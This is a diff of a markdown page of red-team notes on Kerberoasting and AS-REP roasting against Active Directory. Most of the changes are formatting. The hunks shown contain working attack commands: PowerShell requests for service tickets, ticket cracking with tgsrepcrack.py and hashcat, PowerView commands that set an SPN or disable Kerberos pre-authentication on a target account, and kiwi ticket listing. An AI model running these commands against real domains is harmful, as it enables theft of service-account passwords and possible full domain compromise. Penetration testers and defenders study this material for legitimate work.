@@ -2,22 +2,22 @@
 
 ## <mark style="color:red;">Kerberosting</mark>
 
-The process of cracking Kerberos service tickets and rewriting them in order to gain access to the targeted service is called Kerberoast. This is very common attack in red team engagements since it doesn’t require any interaction with the service as legitimate active directory access can be used to request and export the service ticket which can be cracked offline in order to retrieve the plain-text password of the service. This is because service tickets are encrypted with the hash (NTLM) of the service account so any domain user can dump hashes from services without the need to get a shell into the system that is running the service.
+<mark style="color:green;">**The process of cracking Kerberos service tickets and rewriting them in order to gain access to the targeted service is called Kerberoast.**</mark> This is very common attack in red team engagements since it doesn’t require any interaction with the service as legitimate active directory access can be used to request and export the service ticket which can be cracked offline in order to retrieve the plain-text password of the service. <mark style="color:green;">**This is because service tickets are encrypted with the hash (NTLM) of the service account so any domain user can dump hashes from services without the need to get a shell into the system that is running the service.**</mark>
 
 Red Teams usually attempt to crack tickets which have higher possibility to be configured with a weak password. Successful cracking of the ticket will not only give access to the service but sometimes it can lead to full domain compromise as often services might run under the context of an elevated account. These tickets can be identified by considering a number of factors such as:
 
-* SPNs bind to domain user accounts
-* Password last set
-* Password expiration
-* Last logon
+* **SPNs bind to domain user accounts**
+* **Password last set**
+* **Password expiration**
+* **Last logon**
 
 Specifically the Kerberoast attack involves five steps:
 
-1. SPN Discovery
-2. Request Service Tickets
-3. Export Service Tickets
-4. Crack Service Tickets
-5. Rewrite Service Tickets & RAM Injection
+1. <mark style="color:green;">**SPN Discovery**</mark>
+2. <mark style="color:green;">**Request Service Tickets**</mark>
+3. <mark style="color:green;">**Export Service Tickets**</mark>
+4. <mark style="color:green;">**Crack Service Tickets**</mark>
+5. <mark style="color:green;">**Rewrite Service Tickets & RAM Injection**</mark>
 
 The discovery of services in a network by querying the Active Directory for service principal names.
 
@@ -69,7 +69,7 @@ Service Principal Names can be also discovered from non-joined domain systems wi
 
 ### <mark style="color:orange;">Manual</mark>
 
-```
+```powershell
 # Request TGS for kerberoastable account (SPN)
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.targetdomain.com"
@@ -83,7 +83,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
 
 **Targeted kerberoasting by setting SPN -**  We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:
 
-```
+```powershell
 Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}
 ```
 
@@ -91,23 +91,21 @@ Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}
 
 Get the hash for a roastable user (see above for hunting). Using `ASREPRoast.ps1`:
 
-```
+```powershell
 Get-ASREPHash -UserName TargetUser
 ```
 
 Crack the hash with Hashcat:
 
-```
+```shell
 hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
 ```
 
 **Targeted AS-REP roasting by disabling Kerberos pre-authentication -** Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:
 
-```
+```powershell
 Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}
 ```
-
-
 
 ## <mark style="color:red;">Request Service Tickets</mark>
 
@@ -115,7 +113,7 @@ Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}
 
 The easiest method to request the service ticket for a specific SPN is through PowerShell as it has been introduced by [Tim Medin](https://twitter.com/timmedin) during his DerbyCon 4.0 [talk](https://www.youtube.com/watch?v=PUyhlN-E5MU).
 
-```
+```powershell
 # one ticket
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "WINDC/sql.megabank.local:60111"
@@ -174,7 +172,7 @@ kerberos_ticket_list
 
 Or by executing a custom Kiwi command:
 
-```
+```powershell
 kiwi_cmd kerberos::list
 ```
 
